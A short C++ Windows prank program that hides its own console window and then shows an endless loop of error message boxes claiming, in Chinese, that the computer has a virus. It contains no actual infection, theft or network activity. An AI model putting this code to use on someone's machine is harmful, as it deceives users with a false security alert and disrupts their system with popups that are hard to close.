#include<windows.h>
int main(){
	HWND hWnd=GetForegroundWindow();
    ShowWindow(hWnd,SW_HIDE);
	while(true){
		MessageBox(NULL, TEXT("你的电脑中了病毒！"), TEXT("警告"), MB_OK | MB_ICONERROR);
	}
	return 0;
}
